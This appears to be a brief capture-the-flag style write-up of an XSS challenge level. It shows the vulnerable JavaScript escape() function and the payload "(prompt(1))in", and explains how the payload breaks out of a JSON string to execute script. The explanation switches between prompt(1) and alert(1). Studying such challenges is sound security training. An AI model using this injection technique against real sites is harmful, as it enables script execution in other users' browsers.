# level B

```js
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}          
```

payload : "(prompt(1))in"

When we put that payload the statement changes to the following

```var data = {"action":"login","message":"Welcome back, "(alert(1))in"."};```

Here it's checking if alert(1) is in the "." object so it will execute alert(1) first, Hence we'll get the alert.